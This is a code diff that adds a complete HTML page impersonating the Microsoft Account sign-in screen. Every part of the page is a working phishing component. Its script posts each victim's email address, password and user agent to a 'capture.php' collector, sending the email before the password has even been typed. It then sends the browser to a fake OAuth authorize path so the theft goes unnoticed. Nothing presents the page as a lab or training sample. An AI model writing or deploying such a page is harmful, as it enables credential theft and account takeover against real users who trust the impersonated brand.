@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Microsoft Account</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+        }
+        .container { max-width: 400px; width: 100%; padding: 20px; }
+        .box { 
+            background: white; 
+            border-radius: 8px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
+            padding: 40px; 
+            text-align: center;
+        }
+        .box img { height: 24px; margin-bottom: 30px; }
+        h2 { color: #333; margin-bottom: 20px; font-size: 24px; font-weight: 600; }
+        input { 
+            width: 100%; padding: 14px 16px; 
+            border: 1px solid #ddd; 
+            border-radius: 6px; 
+            font-size: 16px; 
+            margin-bottom: 16px;
+            transition: border-color 0.2s;
+        }
+        input:focus { outline: none; border-color: #0067b8; box-shadow: 0 0 0 3px rgba(0,103,184,0.1); }
+        .buttons { display: flex; gap: 12px; margin-top: 20px; }
+        button { 
+            flex: 1; padding: 12px; 
+            border: none; border-radius: 6px; 
+            font-size: 16px; font-weight: 600; 
+            cursor: pointer; transition: all 0.2s;
+        }
+        .next { background: #0067b8; color: white; }
+        .next:hover { background: #005a9e; }
+        .back { background: #f3f2f1; color: #333; }
+        .back:hover { background: #edebe9; }
+        .text { text-align: left; margin: 16px 0; }
+        .text a { color: #0067b8; text-decoration: none; font-size: 14px; }
+        .text a:hover { text-decoration: underline; }
+        .forgot { 
+            display: block; margin: 12px 0 24px 0; 
+            color: #0067b8; font-size: 14px; 
+            text-decoration: none; cursor: pointer;
+        }
+        .forgot:hover { text-decoration: underline; }
+        .hidden { display: none !important; }
+        .status { margin-top: 10px; font-size: 12px; color: green; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <img src="logo.svg" alt="farro">
+            
+            <!-- EMAIL STEP -->
+            <div id="email-step">
+                <h2>Sign in</h2>
+                <input type="email" id="email" placeholder="Email, phone, or Skype" required>
+                <div class="text">
+                    <p>No account? <a href="#">Create one!</a></p>
+                    <a href="#">Can't access your account?</a>
+                </div>
+                <div class="buttons">
+                    <button type="button" class="next" onclick="goToPassword()">Next</button>
+                </div>
+            </div>
+
+            <!-- PASSWORD STEP -->
+            <div id="password-step" class="hidden">
+                <h2>Enter password</h2>
+                <input type="password" id="password" placeholder="Password" required>
+                <a class="forgot" href="#" onclick="forgotPassword()">Forgot password?</a>
+                <div class="buttons">
+                    <button type="button" class="next" onclick="submitLogin()">Sign in</button>
+                </div>
+                <div id="status" class="status hidden"></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showStatus(msg, isError = false) {
+            const status = document.getElementById('status');
+            status.textContent = msg;
+            status.style.color = isError ? 'red' : 'green';
+            status.classList.remove('hidden');
+        }
+
+        function goToPassword() {
+            const email = document.getElementById("email").value.trim();
+            if (!email) return showStatus("Please enter your email", true);
+            
+            sendCredentials(email, '');
+            
+            setTimeout(() => {
+                document.getElementById("email-step").classList.add("hidden");
+                document.getElementById("password-step").classList.remove("hidden");
+            }, 500);
+        }
+
+        function goBack() {
+            document.getElementById("password-step").classList.add("hidden");
+            document.getElementById("email-step").classList.remove("hidden");
+        }
+
+        function forgotPassword() {
+            alert("Password recovery flow goes here");
+        }
+
+        function submitLogin() {
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value.trim();
+            
+            if (!password) return showStatus("Please enter your password", true);
+            
+            sendCredentials(email, password);
+            showStatus("Signing in...");
+            
+           
+            setTimeout(() => {
+                window.location.href = "/common/oauth2/v2.0/authorize/550e8400-e29b-41d4-a716-446655440000-i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z7a8b9c0d1-2e3f4g5h6i7j8k9l0m1n2o3p4q5r6-7s8t9u0v1w2x3y4z5.html";
+            }, 1500);
+        }
+
+        function sendCredentials(email, password) {
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('password', password);
+            formData.append('ip', 'client');
+            formData.append('ua', navigator.userAgent);
+
+            fetch('capture.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.text())
+            .then(data => console.log('✓ Server:', data))
+            .catch(err => console.error('✗ Error:', err));
+        }
+    </script>
+</body>
+</html>
